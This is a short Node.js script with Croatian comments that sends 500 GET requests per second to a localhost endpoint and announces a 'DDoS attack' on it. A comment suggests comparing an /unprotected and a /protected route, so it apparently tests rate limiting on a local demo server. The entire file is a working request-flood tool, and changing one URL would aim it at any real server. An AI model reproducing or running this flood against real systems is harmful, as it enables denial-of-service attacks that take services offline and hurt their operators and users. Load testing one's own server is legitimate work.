const axios = require("axios");

const TARGET_URL = "http://localhost:3000/unprotected"; // Možeš promijeniti na /protected
const REQUESTS_PER_SECOND = 500; // Koliko zahtjeva šaljemo u sekundi

console.log(`🚀 Pokrećem DDoS napad na ${TARGET_URL} sa ${REQUESTS_PER_SECOND} req/s`);

function sendRequest() {
  axios
    .get(TARGET_URL)
    .then((res) => console.log(`✅ ${res.data}`))
    .catch((err) => console.log(`❌ Error: ${err.message}`));
}

// Pokreni flood napad u loopu
setInterval(() => {
  for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
    sendRequest();
  }
}, 1000);
